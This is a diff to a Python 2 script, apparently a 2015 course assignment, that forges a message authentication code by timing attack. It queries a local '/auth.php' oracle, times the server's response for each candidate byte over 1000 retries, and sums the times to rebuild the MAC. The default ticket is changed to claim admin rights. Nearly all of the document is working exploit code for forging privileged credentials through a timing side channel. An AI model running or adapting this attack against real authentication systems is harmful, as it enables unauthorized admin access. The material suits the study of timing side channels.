@@ -2,7 +2,7 @@
 
 # Use timing attack to generate a valid MAC without secret key
 #
-# Create by: Shi Su, AndrewId:shis
+# Author: Shi Su, AndrewId:shis
 # 11/01/2015
 
 import nanotime
@@ -13,22 +13,22 @@ import operator
 
 ORACLE_HOST = "127.0.0.1"
 QUERY_PATH = "/auth.php?"
-RETRY = 3
+RETRY = 1000
 
 # generate ticket according to command line argument
 def generate_ticket():
     if (args.username is None):
-        username = "guest" #shis
+        username = "shis" #shis
     else:
         username = args.username
 
     if (args.is_admin is None):
-        is_admin = "false" #true
+        is_admin = "true" #true
     else:
         is_admin = args.is_admin
 
     if (args.expiration is None):
-        expiration = "2000-01-31" #2022-01-31
+        expiration = "2022-01-31" #2022-01-31
     else:
         expiration = args.expiration
 
@@ -43,23 +43,20 @@ def to_hex_string(array):
 
 
 """ 
-    Ask oracle if the ticket has valid MAC
-    by making HEAD request as we only need the status code
-    Return True if status code is 200, otherwise return False
+    Ask oracle if the ticket has valid MAC  by making GET request 
+    but the only thing we care if the response time
     Query: ticket=xxx&mac=yyy
 """
 def validate_MAC(query):
     conn = httplib.HTTPConnection(ORACLE_HOST)
     conn.request("GET", QUERY_PATH + query)
     resp = conn.getresponse()
-    # content = resp.read()
 
-    # if content is not "INVALID MAC":
-    #     return True
-    # else:
-    #     return False
-
-
+"""
+    For each byte of MAC, try multiple times to obtain 
+    the value of longest response time from validation server
+    which is the correct byte value for the MAC
+"""
 def timming_attack():
 
     ticket = generate_ticket()
@@ -68,53 +65,38 @@ def timming_attack():
     MAC = ""
     # initialize array
     MAC_array = bytearray([0] * 32)
-    dict_freq = {}
-        #     0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0,
-        # 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0
-
-    # compute a baseline 
-    MAC = to_hex_string(MAC_array)
-    query = "ticket=" + ticket + "&mac=" + MAC
-    print "mac: " + MAC
-    before = nanotime.now()
-    # call oracle
-    validate_MAC(query)
-    after = nanotime.now()
-    max_interval = int(after - before)
-    print "interval: " + str(max_interval)
+    dict_time = {}
 
     for i in range (0, 32):
         # One time result maybe unreliable, 
         for k in range (0, RETRY):
-            max_interval = 0
-            candidate = 0
             for j in range (0, 16):
                 # from left to right, test the value of one byte
-                MAC_array[i] = j
                 print str(i)+",("+str(k+1)+"/"+str(RETRY)+"),"+str(j)
+
+                MAC_array[i] = j
                 MAC = to_hex_string(MAC_array)
-                query = "ticket=" + ticket + "&mac=" + MAC
                 print "mac: " + MAC
+
+                query = "ticket=" + ticket + "&mac=" + MAC
                 before = nanotime.now()
                 # call oracle
                 validate_MAC(query)
                 after = nanotime.now()
+                # compute response time
                 interval = int(after - before)
                 print "interval: " + str(interval)
 
-                # if interval become larger, we got another byte correct
-                if interval > max_interval:
-                    max_interval = interval
-                    candidate = j
-            # increase the frequency of candidate
-            if not candidate in dict_freq:
-                dict_freq[candidate] = 1
-            else:
-                dict_freq[candidate] += 1
-        MAC_array[i] = max(dict_freq.iteritems(), key=operator.itemgetter(1))[0]
-
-
-
+                # add the response time to dictionary with previous result
+                if not j in dict_time:
+                    dict_time[j] = interval
+                else:
+                    dict_time[j] += interval
+        # the one with statistically longest resonse time in one set of character
+        # is the valid character in mac 
+        MAC_array[i] = max(dict_time.iteritems(), key=operator.itemgetter(1))[0]
+        # clean the dictonary for next character
+        dict_time.clear()
 
 
 if __name__ == "__main__":
